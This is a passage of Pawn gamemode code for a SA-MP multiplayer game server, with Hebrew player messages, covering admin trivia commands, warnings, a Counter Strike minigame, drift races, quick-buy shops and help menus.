SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
AnsTrivia1 = PlayerInfo[id][Level];
fnm
MaxAns[i] = 0;
TriviaOn = 1;
}
return 1;
}


if(strcmp(cmd,"/triviabank",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");

SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :כמה כסף בבנק יש ל",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
fnm
MaxAns[i] = 0;
TriviaOn = 1;
AnsTrivia1 = PlayerInfo[id][Bank];
}

return 1;
}



if(strcmp(cmd,"/triviavip",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :מה הרמת כבוד של השחקן",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
AnsTrivia1 = PlayerInfo[id][VIPS];
fnm
MaxAns[i] = 0;
TriviaOn = 1;
}
return 1;
}


if(strcmp(cmd,"/triviaWar",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :כמה פעמים ניצח בוואר השחקן",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
AnsTrivia1 = PlayerInfo[id][Wars];
fnm
MaxAns[i] = 0;
TriviaOn = 1;
}
return 1;
}

if(strcmp(cmd,"/triviakills",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");

SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :כמה הריגות יש לשחקן",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
fnm
MaxAns[i] = 0;
TriviaOn = 1;
AnsTrivia1 = PlayerInfo[id][Kills];
}
return 1;
}

if(strcmp(cmd,"/triviahelp",true) == 0)
{
SendClientMessage(playerid,red, "» » [Trivia Help || עזרה טריוויה] » »");
SendClientMessage(playerid,COLOR_PINK, "/TriviaMP שאלה: כמה אנשים יש בשרת");
SendClientMessage(playerid,COLOR_PINK, "/TriviaKills [playerid] :שאלה: הריגות");
SendClientMessage(playerid,COLOR_PINK, "/TriviaHM [playerid] :שאלה: כמה כסף יש על השחקן");
SendClientMessage(playerid,COLOR_PINK, "/TriviaLevel [playerid] :שאלה: מה הרמה של השחקן");
SendClientMessage(playerid,COLOR_PINK, "/TriviaBank [playerid] :שאלה: מה כסף בבנק יש לשחקן");
SendClientMessage(playerid,COLOR_PINK, "/TriviaViP [playerid] :שאלה: מה הרמת כבוד של שחקן מסויים");
SendClientMessage(playerid,COLOR_PINK, "/TriviaWar [playerid] :שאלה: כמה נצחונות בוואר יש לשחקן מסויים");
SendClientMessage(playerid,COLOR_PINK, "/Triviatos [playerid] :שאלה: כמה פעמים שחקן מסויים היה בשרת");
return 1;
}

if(strcmp(cmd,"/triviatos",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");

SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :כמה פעמים היה בשרת השחקן",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
fnm
MaxAns[i] = 0;
TriviaOn = 1;
AnsTrivia1 = PlayerInfo[id][TimeOnServer];
}
return 1;
}


if(strcmp(cmd,"/ans",true) == 0)
{
if(TriviaOn == 0) return SendClientMessage(playerid,WHITE,".אין טירוויה פעיל כרגע");
if(MaxAns[playerid] == 3) return SendClientMessage(playerid,WHITE,".השתתפת יותר מידי פעמים בטיריוויה הזאתי, נסה בטריוויה הבאה");
tmp2 = strtok(cmdtext, idx);
if(20 < strlen(tmp2)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp2)) return SendClientMessage(playerid, WHITE, "Usage: /ans [Answer]");
if(strval(tmp2) == AnsTrivia1)
{
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),".ענה על התשוב נכון  %s :השחקן/ית",GetName(playerid));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$השחקן/ית קיבל סכום של: 600");
format(string, sizeof(string),".%d :התשובה הייתה",AnsTrivia1);
SendClientMessageToAll(0x096E7FF, string);
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
LACY_GiveMoney(playerid,600);
AnsTrivia1 = 12312;
TriviaOn = 0;
PlayerInfo[playerid][Ans] +=1;
dini_IntSet(GetPlayerFile(playerid),"Ans",PlayerInfo[playerid][Ans]);
return 1;
}
SendClientMessage(playerid,WHITE,".טעות, נסה שנית");
MaxAns[playerid] ++;
return 1;
}
    if(strcmp(cmd,"/Warnings",true) == 0)
    {
    
if (!IsPlayerXAdmin(playerid,2)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /Warnings [playerid] [1]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "האיידי שהזנת הינו שגוי");
//if(id == playerid) return SendClientMessage(playerid,WHITE,"אתה לא יכול לתת לעצמך אזהרה.");
if(IsPlayerXAdmin(playerid,2)) return 0;
PlayerInfo[id][Warnings] ++;

SendClientMessage(id,WHITE,".ברגע שתגיע ל10 אזהרות תורחק מהשרת");
format(string, sizeof(string), "%d/10 :אזהרות", PlayerInfo[id][Warnings]),SendClientMessage(id,WHITE, string);
format(string, sizeof(string), "%d/10 :אזהרות של השחקן שהבאת לו אזרה ", PlayerInfo[id][Warnings]),SendClientMessage(playerid,WHITE, string);
		return 1;
    }
//    }


    if(strcmp(cmd,"/setdeaths",true) == 0)
    {
        if(!IsPlayerXAdmin(playerid,20)) return SendClientMessage(playerid,WHITE,". אתה לא אדמין");
        tmp = strtok(cmdtext, idx);
        if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");

		new id = ReturnID(tmp);
//        new tmp2[256];
        tmp2 = strtok(cmdtext, idx);
        new deaths = strval(tmp2);
        if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /setdeaths [playerid] [deaths]");
        if(!strlen(tmp2)) return SendClientMessage(playerid, WHITE, "Usage: /setdeaths [playerid] [deaths]");
        if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
          PlayerInfo[id][Deaths] = deaths;
        return 1;
    }




if(strcmp(cmd, "/cancelpm", true) == 0)
{
if(cancelpm[playerid] ==1) return SendClientMessage(playerid,red,".התיבת הודעות פרטיות שלך כבר חסומה");
cancelpm[playerid] =1;
SendClientMessage(playerid,red,".חסמת את תיבת ההודעות פרטיות שלך");
return 1;
}
if(strcmp(cmd, "/backpm", true) == 0)
{
if(cancelpm[playerid] ==0) return SendClientMessage(playerid,WHITE,"[BlockPms Error] /cancelpm ההודעות פרטיות שלך לא חסמות לחסימה");
cancelpm[playerid] =0;
SendClientMessage(playerid,COLOR_LIGHTGREEN,".החזרת את האפשרות לשלוח לך הודעות פרטיות");
return 1;
}
if(strcmp(cmd, "/exports", true) == 0)
{
if(!CPS_IsPlayerInCheckpoint(playerid,Wang)) return SendClientMessage(playerid,red,".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
SellWangExportVehicle(playerid);
return 1;
}
if(strcmp(cmd, "/buyfast", true) == 0)
{
if(aDoing[playerid] >= 1) return SendClientMessage(playerid,WHITE,".אנא המתן לפני שתעשה פקודה זאת שוב");
aDoing[playerid] ++;
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{
SendClientMessage(playerid,WHITE,".--- help buy fast in all map (38) מערכת קניית כלים מהירה מכל מקום במפה ---");
SendClientMessage(playerid,COLOR_PINK,"* - /buyfast [action]");
SendClientMessage(playerid,COLOR_PINK,"* - /buyfast armour מגן");
SendClientMessage(playerid,COLOR_PINK,"* - /buyfast hp חיים");
SendClientMessage(playerid,COLOR_PINK,"* - /buyfast sw סט נשקים לא תמידי");
return 1;
}

if(strcmp(Roy_Killer,"armour",true) == 0)
{
RK_SA(playerid,100.0,2000,"[/BuyFast] קנה מגן דרך החנות המהירה מכל מקום במפה",COLOR_ORANGE);
return 1;
}
else if(strcmp(Roy_Killer,"hp",true) == 0)
{
RK_HP(playerid,100.0,1500,"[/BuyFast] קנה מגן דרך החנות המהירה מכל מקום במפה",COLOR_ORANGE);
return 1;
}
else if(strcmp(Roy_Killer,"sw",true) == 0)
{
RK_GiveSetWeapons(playerid,26,200,32,300,23,100,6000);
return 1;
}
return 1;
}


//=[Settings]=========================================================
if(strcmp(cmd, "/setting", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{

SendClientMessage(playerid,WHITE,"Usage: /setting [action]");
SendClientMessage(playerid,WHITE,"/setting autologin :להגדיר חיבור אוטומטי לפי אייפי");
SendClientMessage(playerid,WHITE,"/setting speed");
return 1;
}

if(strcmp(Roy_Killer,"speed",true) == 0)
{
if(dini_Int(GetPlayerFile(playerid),"SpeedoOn") == 1)
{
dini_IntSet(GetPlayerFile(playerid),"SpeedoOn",0);
SendClientMessage(playerid,lblue,"-- !הגדרות: מעכשיו לא יוצג יותר הספידומטר ברכבך");
}

else if(dini_Int(GetPlayerFile(playerid),"SpeedoOn") == 0)
{
dini_IntSet(GetPlayerFile(playerid),"SpeedoOn",1);
SendClientMessage(playerid,lblue,"-- !הגדרות: מעכשיו יוצג הספידומטר ברכבך");
}

return true;
}

if(strcmp(Roy_Killer,"autologin",true) == 0)
{
if(PlayerInfo[playerid][autologin] == 0)
{
PlayerInfo[playerid][autologin] = 1;
SendClientMessage(playerid,COLOR_BRIGHTRED,"--- !הגדרות: מעכשיו לא תתחבר לפי האייפי שלך");
return true;
}

if(PlayerInfo[playerid][autologin] == 1)
{
SendClientMessage(playerid, lblue, "--- !הגדרות: מעכשיו תתחבר לפי האייפי שלך");
PlayerInfo[playerid][autologin] = 0;
return true;
}
return true;
}

return SendClientMessage(playerid,red,".שינוי הגדרות שגוי");
}
//=[Counter Strike]===============================================

if(strcmp(cmd, "/cs", true) == 0)
{
if(PlayerInfo[playerid][Level] < 2) return SendClientMessage(playerid,red,".הינו איזור המשמש שחקנים מרמה 2 ומעלה Counter Strike איזור ה");
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{

SendClientMessage(playerid,WHITE,"Usage: /cs [action]");
SendClientMessage(playerid,WHITE,"/cs ct - להצטרף לקבוצת השוטרים");
SendClientMessage(playerid,WHITE,"/cs terror - להצטרף לקבוצת הטרוריטסים");
SendClientMessage(playerid,WHITE,"/cs state - לראות מאזן בין הקבוצות");
SendClientMessage(playerid,WHITE,"/cs leave - לעזוב את המשחק");
return 1;
}


if(strcmp(Roy_Killer,"terror",true) == 0)
{
if(InCounterStrike[playerid] > 0) return SendClientMessage(playerid,red,".Counter Strike אתה כבר נמצא באחת הקבוצות של");

CreateTeleport(playerid,2,2569.1851,-1281.9301,1037.7734,180.0000,0);
ResetPlayerWeapons(playerid);
InCounterStrike[playerid] = 2;
SetPlayerVirtualWorld(playerid,15);
GivePlayerWeapon(playerid,4,1);
GivePlayerWeapon(playerid,16,3);
GivePlayerWeapon(playerid,23,10000);
GivePlayerWeapon(playerid,30,10000);
SendClientMessage(playerid,red,"Counter Strike Terror :נכנסת לקבוצה");
SetPlayerSkin(playerid,179);

SetPlayerColor(playerid,sgba2hex(255,1,1,80));
SetPlayerTeam(playerid,2);
return true;
}


if(strcmp(Roy_Killer,"ct",true) == 0)
{
if(InCounterStrike[playerid] > 0) return SendClientMessage(playerid,red,".Counter Strike אתה כבר נמצא באחת הקבוצות של");


CreateTeleport(playerid,2,2543.6599,-1303.6300,1025.0703,180.0000,0);
ResetPlayerWeapons(playerid);
InCounterStrike[playerid] = 3;
SetPlayerVirtualWorld(playerid,15);
GivePlayerWeapon(playerid,4,1);
GivePlayerWeapon(playerid,16,3);
GivePlayerWeapon(playerid,23,10000);
GivePlayerWeapon(playerid,30,10000);
SendClientMessage(playerid,red,"Counter Strike Ct :נכנסת לקבוצה");
SetPlayerSkin(playerid,285);
SetPlayerColor(playerid,sgba2hex(1,255,1,80));
SetPlayerTeam(playerid,3);
return true;
}

if(strcmp(Roy_Killer,"state",true) == 0)
{
SendClientMessage(playerid,lblue,"~~~ (Counter Strike - State) מאזן המשחק ~~~");
format(string,sizeof(string),"Counter Strike Ct Kills: %d",tempcs[0]);
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),"Counter Strike Terror Kills: %d",tempcs[1]);
SendClientMessage(playerid,red,string);
return true;
}

if(strcmp(Roy_Killer,"leave",true) == 0)
{
if(InCounterStrike[playerid] < 1) return SendClientMessage(playerid,red,".Counter Strike אתה לא נמצא במשחק");
SpawnPlayer(playerid);
InCounterStrike[playerid] = 0;
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".Counter Strike פרשת מהמשחק");
SetPlayerInterior(playerid,0);
SetPlayerTeam(playerid,0);
SetPlayerColor(playerid,sgba2hex(random(256),random(256),random(256),83));
return true;
}


return SendClientMessage(playerid,red,".שגויה Counter Strike פקודת");
}

//=[Drifts]=======================================================
if(strcmp(cmd, "/Drift", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{

SendClientMessage(playerid,WHITE,"Usage: /drift [action]");
SendClientMessage(playerid,COLOR_WHITE,"/drift invite [playerid] - הזמנה לדריפט");
SendClientMessage(playerid,COLOR_WHITE,"/drift accept [playerid invited] - אישור הזמנה לדריפט");
SendClientMessage(playerid,COLOR_WHITE,"/drift cancel - ביטול הזמנה לדריפט");
SendClientMessage(playerid,COLOR_WHITE,"/drift quit - פרישה מתחרות דריפט");

return 1;
}
if(strcmp(Roy_Killer,"help",true) == 0)
{
SendClientMessage(playerid,COLOR_WHITE,"Usage: /drift [action]");
SendClientMessage(playerid,COLOR_WHITE,"/drift invite [playerid] - הזמנה לדריפט");
SendClientMessage(playerid,COLOR_WHITE,"/drift accept [playerid invited] - אישור הזמנה לדריפט");
SendClientMessage(playerid,COLOR_WHITE,"/drift cancel - ביטול הזמנה לדריפט");
SendClientMessage(playerid,COLOR_WHITE,"/drift quit - פרישה מתחרות דריפט");
return 1;
}

if(strcmp(Roy_Killer,"invite",true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(DriftNoNow == 1) return SendClientMessage(playerid,red,".מירוץ הדריפט תפוס כרגע, אנא המתן שהוא יסתיים");
if(id == playerid) return SendClientMessage(playerid,red,".אתה לא יכול להזמין את עצמך למירוץ דריפט");
if(GetPlayerMoney(playerid) <  3000) return  SendClientMessage(playerid,red,".אין לך מספיק כסף על מנת להשתתף במירוץ דריפט המירוץ בוטל, אתה צריך לפחות 3000 דולר על מנת להשתתף");
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /drift invite [playerid]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, red, ".איידי שגוי");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".עליך להיות ברכב");
driftwinner[playerid] = 3000;
driftwinner[id] = 3000;
DriftInvite[id] = playerid;
IfInvite[playerid] = 1;
IfInvite[id] = 1;
DriftNoNow =1;
PrivateCP[id] = 0;
PrivateCP[playerid] =0;
format(string,sizeof(string),".%dלמירוץ דריפט אישי על סכום של ,%s שלחת הזמנה ל",driftwinner,GetName(id));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),".%dלמירוץ דריפט אישי על סכום של ,%sקיבלת הזמנה מ",driftwinner,GetName(playerid));
SendClientMessage(id,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),"[ID Invite %d] /drift help :לקבלת עזרה בצע/י ",playerid);
SendClientMessage(id,COLOR_YELLOW,string);
new vehicleid = GetPlayerVehicleID(playerid);
SetVehiclePos(vehicleid,2320.9492,1393.6464,42.5266);
SetVehicleZAngle(vehicleid,359.9852);
SetTimerEx("CancelDrift",30*1000,0,"i",playerid);
TogglePlayerControllable(playerid, 0);
return 1;
}
if(strcmp(Roy_Killer,"cancel",true) == 0)
{
if(indrift[playerid] == 1) return SendClientMessage(playerid,WHITE,"/drift quit :המירוץ כבר החל, אנא פרוש מהמירוץ בעזרה הפקודה");
if(IfInvite[playerid] == 0) return SendClientMessage(playerid,WHITE,".לא הוזמנת לשום מירוץ דריפט");
for(new Drifter=0; Drifter<MAX_PLAYERS; Drifter++)
{
if(IfInvite[Drifter] == 1 && DriftNoNow == 1)
{
driftwinner[Drifter]=0;
DriftInvite[Drifter] =0;
IfInvite[Drifter] =0;
indrift[Drifter] =0;
DriftNoNow = 0;
format(string,sizeof(string),".ביטל את ההזמנה למירוץ הדריפט,%s",GetName(playerid));
SendClientMessage(Drifter,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),".בהצלחה ,%s ביטלת את המירוץ דריפט שלך ושל",GetName(Drifter));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
}
}
return 1;
}
if(strcmp(Roy_Killer,"quit",true) == 0)
{
if(indrift[playerid] == 0)return SendClientMessage(playerid,WHITE,".אתה לא נמצא בשום מירוץ");
OutDrift(playerid);
return 1;
}

if(strcmp(Roy_Killer,"accept",true) == 0)
{
tmp2 = strtok(cmdtext, idx);
new id = ReturnID(tmp2);
if(20 < strlen(tmp2)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, red, ".איידי שגוי");
if(indrift[playerid] == 1) return SendClientMessage(playerid,red,".כבר אישרת הזמנה או שלא נשלחה שום הזמנה");
if(IfInvite[playerid] == 0)return SendClientMessage(playerid,red,".אתה לא הוזמנת למירוץ דריפט");
if(id != DriftInvite[playerid]) return SendClientMessage(playerid,red, ".שחקן זה לא הזמין אותך לדריפט");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".עליך להיות ברכב");
if(GetPlayerMoney(playerid) <  driftwinner[playerid])
{
SendClientMessage(playerid,WHITE,".אין לך מספיק כסף על מנת להשתתף במירוץ דריפט המירוץ בוטל, אתה צריך לפחות 3000 דולר על מנת להשתתף");
driftwinner[playerid] = 0;
driftwinner[id] = 0;
DriftInvite[id] = 0;
IfInvite[playerid] = 0;
IfInvite[id] = 0;
DriftNoNow =0;
PrivateCP[id] = 0;
PrivateCP[playerid] =0;
SendClientMessage(id,WHITE,".המירוץ בוטל סיבה: חוסר כסף לשחקן המתחרה");
SendClientMessage(id,WHITE,".אין לך מספיק כסף על מנת לאשר את המירוץ דריפט, לכן בוטל");
return 1;
}
new vehicleid = GetPlayerVehicleID(playerid);
SetVehiclePos(vehicleid,2332.2026,1393.6437,42.5268);
SetVehicleZAngle(vehicleid,359.9852);
format(string,sizeof(string),".%s יצאת לדרך למירוץ דריפט יחד עם",GetName(DriftInvite[playerid]));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),".%s יצאת לדרך למירוץ דריפט יחד עם",GetName(playerid));
SendClientMessage(id,COLOR_LIGHTGREEN,string);
indrift[playerid] =1;
indrift[id] = 1;
LACY_GiveMoney(playerid,-driftwinner[playerid]);
LACY_GiveMoney(id,-driftwinner[id]);
PrivateCP[id] = 1;
PrivateCP[playerid] = 1;
driftwinner[playerid] = 6000;
driftwinner[id] = 6000;
SetPlayerRaceCheckpoint(playerid, 0,2297.5369,1509.4496,42.8203,2290.4094,1500.1200,42.6123, 6);//CP2
SetPlayerRaceCheckpoint(id, 0,2297.5369,1509.4496,42.8203,2290.4094,1500.1200,42.6123, 6);//CP2
TogglePlayerControllable(playerid, 1);
TogglePlayerControllable(id, 1);
DriftNoNow = 1 ;

return 1;
}













return 1;
}
//=[Commands]======================================================
if(strcmp(cmd, "/Commands", true) == 0)
{

new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{
SendClientMessage(playerid, red, "Usage: /commands [1/2/all]");

return 1;
}


//----------------------
if(strcmp(Roy_Killer,"1",true) == 0)
{

SendClientMessage(playerid, lblue, "~~~ (1 - Commands) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_YELLOW,"/Kill - מוות עצמי");
SendClientMessage(playerid, COLOR_YELLOW,"/AFK - כניסה למצב אפק");
SendClientMessage(playerid, COLOR_YELLOW,"/UNAFK - יציאה ממצב אפק");
SendClientMessage(playerid, COLOR_YELLOW,"/NextLevel - הרמה הבאה שלך");
SendClientMessage(playerid, COLOR_YELLOW,"/Stats - סטאטס שלך");
SendClientMessage(playerid, COLOR_YELLOW,"/Pstats [id/name] - סטאטס של מישהוא אחר");
SendClientMessage(playerid, COLOR_YELLOW,"/Ignore - על מנת לחסום שחקן");
SendClientMessage(playerid, COLOR_YELLOW,"/UnIgnore - על מנת להוריד חסימה לשחקן");
SendClientMessage(playerid, COLOR_YELLOW,"/ShowLevel [level] - על מנת לראות רמה של שחקנים מחוברים");


return true;
}
else if(strcmp(Roy_Killer,"all",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (2 - Commands) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".במוד הזה מותקנת מגוון פקודות בוא נראה את חלק הקטן מהפקודות");
SendClientMessage(playerid, COLOR_YELLOW,"/players(1) /showid(1) /bigbang(4) /nextlevel(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/sp(2) /lp(1) /profile(1) /pprofile(1) /stats(1) /pstats(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/details(1) /pdetails(1) /pay(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/kill(1) /boome(1) /td(1) /changenick(1) /changepass(1) /saveskin(1) /delskin(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/ignore(1) /unignore(1) /id(/s)(1) /showlevel(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/afk(1) /unafk(1) /me(2)");
return true;
}

else if(strcmp(Roy_Killer,"2",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (2 - Commands) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_YELLOW,"/PM [playerid] [message] - לשליחת הודעה פרטית");
SendClientMessage(playerid, COLOR_YELLOW,"/Pay [Playerid] [amount] - על מנת להעביר כספים");
SendClientMessage(playerid, COLOR_YELLOW,"/Call [id/name] להתקשר לשחקן /Hangup לנתק לשחקן");
SendClientMessage(playerid, COLOR_YELLOW,"/players - גבול כניסת שחקנים");
SendClientMessage(playerid, COLOR_YELLOW,"/ID - מספר האיידי איתו אתה מופיע בשרת");
SendClientMessage(playerid, COLOR_YELLOW,"/sp(2) - שמירת מיקום");
SendClientMessage(playerid, COLOR_YELLOW,"/lp(2) - טעינת מיקום");
return true;
}
return SendClientMessage(playerid,red,".תפריט פקודות שגוי");
}


if(strcmp(cmd, "/teleports", true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (2 - Telepots) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".עזרה שיגורים שבוא ניתן לזוז ממקום למקום בעזרת פקודה ולהגיע למקומות הריגה במהירות רבה יותר");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות שיגורים");
SendClientMessage(playerid, COLOR_YELLOW,"/sf(1) /lv(1) /ls(1) /ap(1) /race(1) /ramp(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/dj(1) /sandkings(1) /jump(1) /army(1) /carpark(1) /cycletrip(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/arena(1) /skydive(1) /drifts(1) /garage(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/infernus(1) /bustrip(1) /biketrip(1) /fight(1) /alp(1) /snipe(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/pepe(1) /kickstart(1) /lc(1) /bank(1) /parkour(4) /ammu(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/water(3) /diving(3) /dm /bazooka(10)");
SendClientMessage(playerid, COLOR_YELLOW,"/wdm(1) /hdm(1) /dm(1) /ship(1) /shipmoney(3) /ships(1) /ctest(1)");
return 1;
}


//===============================MonsterStart CoMonsterNoTeleportionand=================================
if(!strcmp(cmd, "/startMonster", true)) {
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!IsPlayerXAdmin(playerid,10)) return 0;
if(MonsterOn == 1) return SendClientMessage(playerid, red, ".יש כבר גאטר פעיל");
GetPlayerName(playerid, Adminname, sizeof(Adminname));
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/Monster~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
fnm
MonStart[i] =0;
}
SetTimer("MonsterStart",1200,0);
KillTimer(MCheckTimeMonster);
KillTimer(KcheckMonster);
return 1; }
//===============================MJoin CoMonsterNoTeleportionand==================================
if(!strcmp(cmd, "/monster", true))
{
if(MonsterOn == 0) return 0;
if(MoOn == 1) return SendClientMessage(playerid, red, ".הגאטר כבר התחיל, נסה פעם הבאה ");
if(MonsterPlayers == 30) return SendClientMessage(playerid, red, ".כל המקומות נתפסו, נסה פעם באה");
if(iNmOnster[playerid] == 1) return SendClientMessage(playerid, red, ".הצטרפת כבר לגאטר, חכה בסבלנות");
MonsterPlayers ++; iNmOnster[playerid] = 1;
MoneyWinnerMonster +=500;


LACY_GiveMoney(playerid,-500);
format(string,sizeof(string),".%d :הינך משתתף/ת מספר",MonsterPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להתנגש בחשקנים מתחרים");
SendClientMessage(playerid,0xE21E1EFF,string);
SetPlayerVirtualWorld(playerid,0);
